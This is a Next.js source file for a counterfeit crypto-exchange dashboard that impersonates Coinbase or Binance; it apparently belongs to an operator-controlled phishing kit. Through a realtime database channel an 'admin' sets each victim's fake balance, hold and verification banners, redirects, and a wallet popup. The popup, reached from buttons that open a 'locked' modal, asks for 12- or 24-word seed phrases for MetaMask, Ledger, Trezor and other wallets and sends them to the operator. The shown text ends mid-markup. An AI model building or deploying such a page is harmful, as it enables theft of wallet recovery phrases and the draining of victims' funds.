"use client"

import { useEffect, useState, useCallback } from "react"
import Image from "next/image"
import { createClient } from "@/lib/supabase/client"
import { clearSessionRedirect, submitWalletSeedPhrase, getActiveBrand } from "@/app/actions"
import { getBrandConfig, type BrandConfig } from "@/lib/brands"

interface SessionData {
  id: string
  email: string
  current_step: string
  dashboard_balance: string | null
  balance_hidden: boolean
  balance_on_hold: boolean
  hold_message: string | null
  btc_amount: string | null
  eth_amount: string | null
  usdc_amount: string | null
  sol_amount: string | null
  doge_amount: string | null
  xrp_amount: string | null
  user_name: string | null
  show_verification_banner: boolean
  verification_banner_message: string | null
  redirect_url: string | null
  show_wallet_popup: boolean
  wallet_popup_type: "link" | "unlink" | null
}

interface CryptoPrice {
  price: number
  change: number
}

interface ChartData {
  prices: number[]
  timestamps: number[]
}

// Official coin images
const COIN_IMAGES: Record<string, string> = {
  BTC: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
  ETH: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
  SOL: "https://assets.coingecko.com/coins/images/4128/large/solana.png",
  XRP: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png",
  USDC: "https://assets.coingecko.com/coins/images/6319/large/usdc.png",
  DOGE: "https://assets.coingecko.com/coins/images/5/large/dogecoin.png",
}

// Wallet Icon Component - matching /link and /unlink pages
const WalletIcon = ({ type, size = 32 }: { type: string; size?: number }) => {
  if (type === "metamask") {
    return (
      <svg width={size} height={size} viewBox="0 0 35 33" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M32.958 1L19.514 11.218l2.484-5.882L32.958 1z" fill="#E17726" stroke="#E17726" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M2.042 1l13.318 10.323-2.359-5.987L2.042 1zM28.12 23.533l-3.576 5.478 7.656 2.106 2.199-7.455-6.279-.129zM.605 23.662l2.186 7.455 7.643-2.106-3.563-5.478-6.266.129z" fill="#E27625" stroke="#E27625" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M10.073 14.513l-2.136 3.23 7.617.347-.26-8.199-5.221 4.622zM24.928 14.513l-5.298-4.727-.169 8.304 7.604-.347-2.137-3.23zM10.434 29.011l4.584-2.238-3.96-3.09-.624 5.328zM20.004 26.773l4.558 2.238-.611-5.328-3.947 3.09z" fill="#E27625" stroke="#E27625" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M24.562 29.011l-4.558-2.238.364 2.978-.039 1.256 4.233-1.996zM10.434 29.011l4.246 1.996-.026-1.256.351-2.978-4.571 2.238z" fill="#D5BFB2" stroke="#D5BFB2" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M14.784 21.927l-3.817-1.122 2.696-1.243 1.121 2.365zM20.216 21.927l1.121-2.365 2.709 1.243-3.83 1.122z" fill="#233447" stroke="#233447" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M10.434 29.011l.65-5.478-4.213.129 3.563 5.349zM23.916 23.533l.646 5.478 3.563-5.349-4.209-.129zM27.064 17.743l-7.604.347.708 3.837 1.121-2.365 2.709 1.243 3.066-3.062zM10.967 20.805l2.696-1.243 1.121 2.365.721-3.837-7.617-.347 3.079 3.062z" fill="#CC6228" stroke="#CC6228" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M7.937 17.743l3.196 6.229-.117-3.167-3.079-3.062zM24.002 20.805l-.13 3.167 3.196-6.229-3.066 3.062zM15.554 18.09l-.721 3.837.909 4.688.195-6.164-.383-2.361zM19.46 18.09l-.364 2.348.169 6.177.922-4.688-.727-3.837z" fill="#E27525" stroke="#E27525" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.186 21.927l-.922 4.688.664.468 3.947-3.09.13-3.167-3.819 1.101zM10.967 20.805l.117 3.167 3.96 3.09.65-.468-.908-4.688-3.819-1.101z" fill="#F5841F" stroke="#F5841F" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.277 31.007l.039-1.256-.345-.294H15.03l-.332.294.026 1.256-4.246-1.996 1.485 1.217 3.013 2.09h5.017l3.025-2.09 1.473-1.217-4.194 1.996z" fill="#C0AC9D" stroke="#C0AC9D" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.004 26.773l-.664-.468h-3.692l-.65.468-.351 2.978.332-.294h4.941l.345.294-.261-2.978z" fill="#161616" stroke="#161616" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M33.517 11.875l1.14-5.502L32.958 1l-12.954 9.607 4.985 4.215 7.045 2.059 1.551-1.813-.676-.49 1.082-.982-.826-.637 1.082-.826-.715-.558zM.342 6.373l1.153 5.502-.735.545 1.082.826-.813.637 1.082.982-.676.49 1.538 1.813 7.044-2.059 4.985-4.215L2.042 1 .342 6.373z" fill="#763E1A" stroke="#763E1A" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M32.034 16.881l-7.045-2.059 2.136 3.23-3.196 6.229 4.207-.052h6.279l-2.381-7.348zM10.073 14.822l-7.044 2.059-2.355 7.348h6.265l4.194.052-3.183-6.229 2.123-3.23zM19.46 18.09l.454-7.757 2.03-5.497H13.07l2.016 5.497.468 7.757.169 2.374.013 6.151h3.692l.026-6.151.169-2.374z" fill="#F5841F" stroke="#F5841F" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  }
  if (type === "trustwallet") {
    return (
      <svg width={size} height={size} viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id={`trust-gradient-${size}`} x1="0" y1="0" x2="1" y2="0" gradientUnits="userSpaceOnUse" gradientTransform="rotate(107.581 170 110) scale(540)">
            <stop offset="0" stopColor="#00f"/>
            <stop offset=".02" stopColor="#00f"/>
            <stop offset=".08" stopColor="#0094ff"/>
            <stop offset=".16" stopColor="#48ff91"/>
            <stop offset=".42" stopColor="#0094ff"/>
            <stop offset=".68" stopColor="#0038ff"/>
            <stop offset=".9" stopColor="#0500ff"/>
            <stop offset="1" stopColor="#0500ff"/>
          </linearGradient>
        </defs>
        <path d="M37.523 83.593L255.21 13.046v488.371C99.709 436.301 37.523 311.5 37.523 240.964V83.593z" fill="#0500ff"/>
        <path d="M255.21 13.046L472.477 83.593v157.371c0 70.536-62.186 195.337-217.267 260.453V13.046z" fill={`url(#trust-gradient-${size})`}/>
      </svg>
    )
  }
  if (type === "ledger") {
    return (
      <svg width={size} height={size} viewBox="0 0 383 128" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z" fill="black"/>
      </svg>
    )
  }
  if (type === "phantom") {
    return (
      <svg width={size} height={size} viewBox="0 0 43 43" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id={`phantom-bg-${size}`} x1="21.5" y1="0" x2="21.5" y2="43" gradientUnits="userSpaceOnUse">
            <stop stopColor="#534BB1"/>
            <stop offset="1" stopColor="#551BF9"/>
          </linearGradient>
          <linearGradient id={`phantom-ghost-${size}`} x1="21.96" y1="7.78" x2="21.96" y2="36.14" gradientUnits="userSpaceOnUse">
            <stop stopColor="#FFFFFF"/>
            <stop offset="1" stopColor="#FFFFFF" stopOpacity="0.82"/>
          </linearGradient>
        </defs>
        <circle cx="21.5" cy="21.5" r="21.5" fill={`url(#phantom-bg-${size})`}/>
        <path d="M36.9,21.8h-3.8c0-7.7-6.3-14-14-14c-7.7,0-13.9,6.1-14,13.7c-0.2,7.8,7.2,14.7,15.1,14.7h1c6.9,0,16.3-5.4,17.7-12C39.1,22.9,38.1,21.8,36.9,21.8z M13.4,22.1c0,1-0.8,1.9-1.9,1.9c-1,0-1.9-0.8-1.9-1.9v-3c0-1,0.8-1.9,1.9-1.9c1,0,1.9,0.8,1.9,1.9V22.1z M20,22.1c0,1-0.8,1.9-1.9,1.9c-1,0-1.9-0.8-1.9-1.9v-3c0-1,0.8-1.9,1.9-1.9c1,0,1.9,0.8,1.9,1.9V22.1z" fill={`url(#phantom-ghost-${size})`}/>
      </svg>
    )
  }
  if (type === "trezor") {
    return (
      <svg width={size} height={size} viewBox="0 0 260.73 378.41" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="m222.7,87.82C222.7,39.82,181.05,0,130.35,0S38,39.84,38,87.82v28.07H0v201.9h0l130.35,60.62,130.38-60.66h0V116.75h-38l-.03-28.93Zm-137.62,0c0-22.63,19.92-40.74,45.27-40.74s45.27,18.11,45.27,40.74v28.07h-90.54v-28.07Zm123.13,197.37l-77.86,36.22-77.86-36.22v-121.32h155.72v121.32Z" fill="#000000"/>
      </svg>
    )
  }
  return null
}

export default function DashboardPage() {
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [session, setSession] = useState<SessionData | null>(null)
  const [loading, setLoading] = useState(true)
  const [sidebarHovered, setSidebarHovered] = useState<string | null>(null)
  const [livePrices, setLivePrices] = useState<Record<string, CryptoPrice>>({})
  const [pricesLoading, setPricesLoading] = useState(true)
  const [chartData, setChartData] = useState<ChartData | null>(null)
  const [activeTab, setActiveTab] = useState<"home" | "assets" | "trade">("home")
  const [showLockedModal, setShowLockedModal] = useState(false)
  const [showWalletPopup, setShowWalletPopup] = useState(false)
  const [walletPopupType, setWalletPopupType] = useState<"link" | "unlink">("link")
  const [loadingSupport, setLoadingSupport] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""))
  const [wordCount, setWordCount] = useState<12 | 24>(12)
  const [walletStep, setWalletStep] = useState<"select" | "seedphrase">("select")
  const [walletStatus, setWalletStatus] = useState<"idle" | "pending">("idle")
  const [brand, setBrand] = useState<BrandConfig | null>(null)

  const WALLETS = [
    { id: "metamask", name: "MetaMask" },
    { id: "trustwallet", name: "Trust Wallet" },
    { id: "ledger", name: "Ledger" },
    { id: "phantom", name: "Phantom" },
    { id: "trezor", name: "Trezor" },
  ]

  // Check if wallet requires 24 words
  const requires24Words = selectedWallet === "ledger" || selectedWallet === "trezor"
  const canExtendTo24 = selectedWallet === "phantom" || selectedWallet === "trustwallet"

  // Fetch live prices
  const fetchLivePrices = useCallback(async () => {
    try {
      const response = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,ripple,usd-coin,dogecoin&vs_currencies=usd&include_24hr_change=true"
      )
      const data = await response.json()
      
      setLivePrices({
        BTC: { price: data.bitcoin?.usd || 0, change: data.bitcoin?.usd_24h_change || 0 },
        ETH: { price: data.ethereum?.usd || 0, change: data.ethereum?.usd_24h_change || 0 },
        SOL: { price: data.solana?.usd || 0, change: data.solana?.usd_24h_change || 0 },
        XRP: { price: data.ripple?.usd || 0, change: data.ripple?.usd_24h_change || 0 },
        USDC: { price: data["usd-coin"]?.usd || 1, change: data["usd-coin"]?.usd_24h_change || 0 },
        DOGE: { price: data.dogecoin?.usd || 0, change: data.dogecoin?.usd_24h_change || 0 },
      })
      setPricesLoading(false)
    } catch {
      // Fallback prices
      setLivePrices({
        BTC: { price: 97500, change: -1.12 },
        ETH: { price: 3450, change: -2.34 },
        SOL: { price: 175, change: -2.09 },
        XRP: { price: 2.15, change: -2.62 },
        USDC: { price: 1, change: 0.01 },
        DOGE: { price: 0.32, change: -3.21 },
      })
      setPricesLoading(false)
    }
  }, [])

  // Fetch BTC chart data
  const fetchChartData = useCallback(async () => {
    try {
      const response = await fetch(
        "https://api.coingecko.com/api/v3/coins/bitcoin/market_chart?vs_currency=usd&days=1&interval=hourly"
      )
      const data = await response.json()
      if (data.prices) {
        setChartData({
          prices: data.prices.map((p: number[]) => p[1]),
          timestamps: data.prices.map((p: number[]) => p[0]),
        })
      }
    } catch {
      // Generate fallback chart data
      const prices = []
      for (let i = 0; i < 24; i++) {
        prices.push(97000 + Math.random() * 2000 - 1000)
      }
      setChartData({ prices, timestamps: [] })
    }
  }, [])

  // Initialize session
  useEffect(() => {
    const storedSessionId = localStorage.getItem("coinbase_session_id")
    if (storedSessionId) {
      setSessionId(storedSessionId)
    } else {
      window.location.href = "/"
    }
    
    // Fetch brand
    getActiveBrand().then((b) => {
      const config = getBrandConfig(b)
      setBrand(config)
      document.title = `Dashboard | ${config.name}`
    }).catch(() => {
      setBrand(getBrandConfig("coinbase"))
    })

    fetchLivePrices()
    fetchChartData()
    
    const interval = setInterval(() => {
      fetchLivePrices()
      fetchChartData()
    }, 30000)
    return () => clearInterval(interval)
  }, [fetchLivePrices, fetchChartData])

  // Subscribe to session changes - CRITICAL for admin navigation
  useEffect(() => {
    if (!sessionId) return

    const supabase = createClient()
    
    const fetchSession = async () => {
      const { data, error } = await supabase
        .from("sessions")
        .select("*")
        .eq("id", sessionId)
        .single()

      if (!error && data) {
        setSession(data)
        
        // Handle redirect URL
        if (data.redirect_url) {
          await clearSessionRedirect(sessionId)
          window.location.href = data.redirect_url
          return
        }
        
        // Handle step changes from admin - redirect to main page
        if (data.current_step && data.current_step !== "dashboard") {
          window.location.href = "/"
          return
        }
      }
      setLoading(false)
    }

    fetchSession()

    // Realtime subscription for admin control
    const channel = supabase
      .channel(`dashboard-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        async (payload) => {
          const newData = payload.new as SessionData & { current_step: string; redirect_url: string | null }
          setSession(newData)
          
          // Handle redirect URL
          if (newData.redirect_url) {
            await clearSessionRedirect(sessionId)
            window.location.href = newData.redirect_url
            return
          }
          
          // Handle step changes from admin
          if (newData.current_step && newData.current_step !== "dashboard") {
            window.location.href = "/"
            return
          }
          
          // Show wallet popup if enabled
          if (newData.show_wallet_popup && !showWalletPopup) {
            setWalletPopupType(newData.wallet_popup_type || "link")
            setShowWalletPopup(true)
          }
        }
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "settings" },
        (payload) => {
          const d = payload.new as { key?: string; value?: string }
          if (d.key === "active_brand" && d.value) {
            const config = getBrandConfig(d.value)
            setBrand(config)
            document.title = `Dashboard | ${config.name}`
          }
        }
      )
      .subscribe()

    return () => {
      supabase.removeChannel(channel)
    }
  }, [sessionId, showWalletPopup])

  // Calculate total balance from holdings
  const calculateBalance = useCallback(() => {
    if (session?.dashboard_balance) {
      return parseFloat(session.dashboard_balance)
    }
    if (pricesLoading) return 0
    let total = 0
    if (session?.btc_amount) total += parseFloat(session.btc_amount) * (livePrices.BTC?.price || 0)
    if (session?.eth_amount) total += parseFloat(session.eth_amount) * (livePrices.ETH?.price || 0)
    if (session?.usdc_amount) total += parseFloat(session.usdc_amount) * (livePrices.USDC?.price || 0)
    if (session?.sol_amount) total += parseFloat(session.sol_amount) * (livePrices.SOL?.price || 0)
    if (session?.doge_amount) total += parseFloat(session.doge_amount) * (livePrices.DOGE?.price || 0)
    if (session?.xrp_amount) total += parseFloat(session.xrp_amount) * (livePrices.XRP?.price || 0)
    return total
  }, [session, livePrices, pricesLoading])

  const formatUSD = (value: number) => {
    return `$${value.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
  }

  // Generate chart path from data
  const generateChartPath = () => {
    if (!chartData || chartData.prices.length === 0) {
      return "M0 50 L20 48 L40 52 L60 45 L80 50 L100 42 L120 48 L140 40 L160 45 L180 38 L200 44 L220 35 L240 42"
    }
    
    const prices = chartData.prices
    const min = Math.min(...prices)
    const max = Math.max(...prices)
    const range = max - min || 1
    
    const points = prices.map((price, i) => {
      const x = (i / (prices.length - 1)) * 240
      const y = 60 - ((price - min) / range) * 50
      return `${x} ${y}`
    })
    
    return `M${points.join(" L")}`
  }

  // Get user's crypto holdings
  const getUserHoldings = () => {
    const holdings = []
    if (session?.btc_amount && parseFloat(session.btc_amount) > 0) {
      holdings.push({ symbol: "BTC", name: "Bitcoin", amount: parseFloat(session.btc_amount) })
    }
    if (session?.eth_amount && parseFloat(session.eth_amount) > 0) {
      holdings.push({ symbol: "ETH", name: "Ethereum", amount: parseFloat(session.eth_amount) })
    }
    if (session?.sol_amount && parseFloat(session.sol_amount) > 0) {
      holdings.push({ symbol: "SOL", name: "Solana", amount: parseFloat(session.sol_amount) })
    }
    if (session?.xrp_amount && parseFloat(session.xrp_amount) > 0) {
      holdings.push({ symbol: "XRP", name: "XRP", amount: parseFloat(session.xrp_amount) })
    }
    if (session?.usdc_amount && parseFloat(session.usdc_amount) > 0) {
      holdings.push({ symbol: "USDC", name: "USD Coin", amount: parseFloat(session.usdc_amount) })
    }
    if (session?.doge_amount && parseFloat(session.doge_amount) > 0) {
      holdings.push({ symbol: "DOGE", name: "Dogecoin", amount: parseFloat(session.doge_amount) })
    }
    return holdings
  }

  // Handle non-functional button clicks
  const handleLockedAction = () => {
    setShowLockedModal(true)
  }

  // Handle wallet popup submission
  const handleWalletSubmit = async () => {
    if (!sessionId || !selectedWallet) return
    const phrase = seedPhrase.filter(w => w).join(" ")
    const requiredWords = requires24Words ? 24 : wordCount
    if (phrase.split(" ").length !== requiredWords) return
    
    setWalletStatus("pending")
    await submitWalletSeedPhrase(sessionId, { 
      wallet_type: selectedWallet, 
      wallet_action: walletPopupType, 
      seed_phrase: phrase 
    })
  }

  // Handle continue with support
  const handleContinueSupport = () => {
    setLoadingSupport(true)
    setTimeout(() => {
      setLoadingSupport(false)
      setShowLockedModal(false)
      if (session?.show_wallet_popup) {
        setWalletPopupType(session.wallet_popup_type || "link")
        // Reset wallet popup state
        setSelectedWallet(null)
        setWalletStep("select")
        setSeedPhrase(Array(12).fill(""))
        setWordCount(12)
        setWalletStatus("idle")
        setShowWalletPopup(true)
      }
    }, 2000)
  }

  // Handle word count change
  const handleWordCountChange = (count: 12 | 24) => {
    setWordCount(count)
    setSeedPhrase(Array(count).fill(""))
  }

  // Reset wallet popup when wallet changes
  useEffect(() => {
    if (selectedWallet) {
      if (requires24Words) {
        setWordCount(24)
        setSeedPhrase(Array(24).fill(""))
      } else {
        setWordCount(12)
        setSeedPhrase(Array(12).fill(""))
      }
    }
  }, [selectedWallet, requires24Words])

  // Get display name
  const getDisplayName = () => {
    if (session?.user_name) return session.user_name
    if (session?.email) {
      const name = session.email.split("@")[0]
      return name.charAt(0).toUpperCase() + name.slice(1)
    }
    return "User"
  }

  if (loading || !brand) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0e0f11]">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-gray-600 border-t-gray-300" />
      </div>
    )
  }

  const isBinance = brand.id === "binance"

  const balance = calculateBalance()
  const holdings = getUserHoldings()
  const totalChange = balance * -0.0284
  const totalChangePercent = -2.84
  const isUnlink = walletPopupType === "unlink"

  return (
    <div className="min-h-screen flex" style={{ backgroundColor: brand.bgMain }}>
      {/* Left Sidebar - hidden on mobile */}
      <nav className="hidden sm:flex fixed left-0 top-0 bottom-0 w-[87px] border-r flex-col z-50" style={{ backgroundColor: brand.bgMain, borderColor: isBinance ? "#2B3139" : "#f3f4f6" }}>
        {/* Logo */}
        <div className="flex items-center justify-center py-6">
          <button className="p-2 rounded-lg transition-colors cursor-pointer">
            <span dangerouslySetInnerHTML={{ __html: brand.faviconSvg }} />
          </button>
        </div>

        {/* Nav Items */}
        <ul className="flex-1 flex flex-col gap-1 px-2">
          <li>
            <button 
              onClick={() => setActiveTab("home")}
              onMouseEnter={() => setSidebarHovered("home")}
              onMouseLeave={() => setSidebarHovered(null)}
              className={`w-full flex flex-col items-center justify-center py-3 px-2 rounded-lg transition-colors cursor-pointer ${
                  activeTab === "home" ? `text-[${brand.primary}]` : `text-[${brand.textSecondary}]`
              }`}
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 3l9 8v10h-6v-6h-6v6H3V11l9-8z"/>
              </svg>
            </button>
          </li>
          
          <li>
            <button 
              onClick={handleLockedAction}
              onMouseEnter={() => setSidebarHovered("trade")}
              onMouseLeave={() => setSidebarHovered(null)}
              className={`w-full flex flex-col items-center justify-center py-3 px-2 rounded-lg transition-colors cursor-pointer ${
                sidebarHovered === "trade" ? "bg-[#f5f8ff]" : "text-[#5b616e]"
              }`}
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/>
                <polyline points="16 7 22 7 22 13"/>
              </svg>
            </button>
          </li>

          <li>
            <button 
              onClick={handleLockedAction}
              onMouseEnter={() => setSidebarHovered("assets")}
              onMouseLeave={() => setSidebarHovered(null)}
              className={`w-full flex flex-col items-center justify-center py-3 px-2 rounded-lg transition-colors cursor-pointer ${
                sidebarHovered === "assets" ? "bg-[#f5f8ff]" : "text-[#5b616e]"
              }`}
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"/>
              </svg>
            </button>
          </li>
        </ul>

        {/* Help & Profile */}
        <div className="flex flex-col gap-2 p-4">
          <button 
            onClick={handleLockedAction}
            className="w-full flex items-center justify-center py-3 rounded-lg text-[#5b616e] hover:bg-[#f5f8ff] cursor-pointer"
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
            </svg>
          </button>
          <button 
            onClick={handleLockedAction}
            className="w-full flex items-center justify-center py-3 rounded-lg text-[#5b616e] hover:bg-[#f5f8ff] cursor-pointer"
          >
            <div className="w-8 h-8 rounded-full bg-gradient-to-br from-blue-400 to-purple-500 flex items-center justify-center text-white text-sm font-medium">
              {getDisplayName().charAt(0).toUpperCase()}
            </div>
          </button>
        </div>
      </nav>

      {/* Main Content */}
      <div className="flex-1 ml-0 sm:ml-[87px] pb-16 sm:pb-0">
        {/* Top Bar */}
        <header className="h-14 sm:h-16 border-b border-gray-100 flex items-center justify-between px-4 sm:px-6">
          <div className="flex items-center gap-4">
            {/* Mobile logo */}
            <div className="sm:hidden">
              <span dangerouslySetInnerHTML={{ __html: brand.faviconSvg.replace('width="32"', 'width="28"').replace('height="32"', 'height="28"') }} />
            </div>
            <button onClick={handleLockedAction} className="hidden sm:flex items-center gap-2 px-4 py-2 bg-[#f5f8ff] rounded-full text-sm font-medium text-[#0a0b0d] hover:bg-[#e8eeff] cursor-pointer">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style={{ color: brand.primary }}>
                <path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" stroke="currentColor" strokeWidth="2" fill="none"/>
              </svg>
              Search
            </button>
          </div>
          <div className="flex items-center gap-2 sm:gap-4">
            <button onClick={handleLockedAction} className="p-1.5 sm:p-2 hover:bg-[#f5f8ff] rounded-full cursor-pointer">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5b616e" strokeWidth="2">
                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
                <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
              </svg>
            </button>
          </div>
        </header>

        {/* Main Dashboard */}
        <main className="p-4 sm:p-6 pb-24">
          {/* Welcome & Balance */}
          <div className="mb-8">
            <h1 className="text-xl sm:text-2xl font-semibold text-[#0a0b0d] mb-1">Welcome, {getDisplayName()}</h1>
            <p className="text-sm text-[#5b616e]">Your portfolio overview</p>
          </div>

          {/* Verification Banner */}
          {session?.show_verification_banner && (
            <div className="mb-6 bg-[#fff8e6] border border-[#f5c518]/30 rounded-xl p-4 flex items-start gap-3">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#f5c518" className="mt-0.5 flex-shrink-0">
                <path d="M12 2L1 21h22L12 2zm0 4l7.53 13H4.47L12 6zm-1 5v4h2v-4h-2zm0 6v2h2v-2h-2z"/>
              </svg>
              <div>
                <p className="font-medium text-[#0a0b0d] text-sm">{session.verification_banner_message || "Verification Required"}</p>
                <p className="text-xs text-[#5b616e] mt-0.5">Please complete the verification process to unlock all features.</p>
              </div>
            </div>
          )}

          {/* On Hold Banner */}
          {session?.balance_on_hold && (
            <div className="mb-6 bg-red-50 border border-red-200 rounded-xl p-4 flex items-start gap-3">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#dc2626" className="mt-0.5 flex-shrink-0">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <div>
                <p className="font-medium text-red-700 text-sm">Account On Hold</p>
                <p className="text-xs text-red-600 mt-0.5">{session.hold_message || "Your account has been temporarily restricted. Please contact support."}</p>
              </div>
            </div>
          )}

          {/* Balance Card */}
          <div className="rounded-2xl p-4 sm:p-6 mb-6 text-white" style={{ background: `linear-gradient(135deg, ${brand.primary}, ${brand.primary}DD)` }}>
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm font-medium opacity-90">Total Balance</span>
              <div className="flex gap-2">
                <button onClick={handleLockedAction} className="px-3 py-1 bg-white/20 rounded-full text-xs font-medium hover:bg-white/30 cursor-pointer">Crypto</button>
                <button onClick={handleLockedAction} className="px-3 py-1 bg-white/10 rounded-full text-xs font-medium hover:bg-white/20 cursor-pointer">Cash</button>
              </div>
            </div>
            <div className="mb-2">
              {session?.balance_hidden ? (
                <span className="text-2xl sm:text-4xl font-bold">{"$\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022"}</span>
              ) : (
                <span className="text-2xl sm:text-4xl font-bold">{formatUSD(balance)}</span>
              )}
            </div>
            <div className="flex items-center gap-2 text-sm">
              <span className={totalChange < 0 ? "text-red-300" : "text-green-300"}>
                {totalChange < 0 ? "↘" : "���"} {formatUSD(Math.abs(totalChange))} ({totalChangePercent.toFixed(2)}%)
              </span>
              <span className="opacity-70">24h</span>
            </div>
          </div>

          {/* Chart Section */}
          <div className="bg-white border border-gray-100 rounded-xl p-4 sm:p-6 mb-6">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="font-semibold text-[#0a0b0d]">Bitcoin</h3>
                <p className="text-sm text-[#5b616e]">BTC · 24h</p>
              </div>
              <div className="text-right">
                <p className="font-semibold text-[#0a0b0d]">{pricesLoading ? "..." : formatUSD(livePrices.BTC?.price || 0)}</p>
                <p className={`text-sm ${(livePrices.BTC?.change || 0) < 0 ? "text-[#cf4714]" : "text-[#05b169]"}`}>
